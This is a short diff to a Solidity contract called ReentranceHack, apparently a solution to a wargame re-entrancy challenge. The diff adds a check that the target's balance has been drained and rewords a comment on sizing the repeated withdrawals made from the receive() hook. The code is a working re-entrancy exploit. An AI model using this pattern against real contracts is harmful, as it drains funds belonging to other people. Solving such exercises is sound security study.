@@ -19,6 +19,8 @@ contract ReentranceHack {
         reentrance.donate{value: msg.value}(address(this));
         reentrance.withdraw(msg.value);
 
+        require(address(reentrance).balance == 0, "FAILED!!!");
+
         // Recover sent ether
         selfdestruct(payable(msg.sender));
     }
@@ -26,7 +28,8 @@ contract ReentranceHack {
     receive() external payable {
         uint256 balance = reentrance.balanceOf(address(this));
 
-        // Try to withdraw the smallest amount possible, so that the transaction does not revert
+        // Check if the contract balance is smaller than the donation.
+        // Withdraw the lesser of the two amounts, so that the transaction does not revert
         uint256 withdrawableAmount = balance < 0.001 ether
             ? balance
             : 0.001 ether;
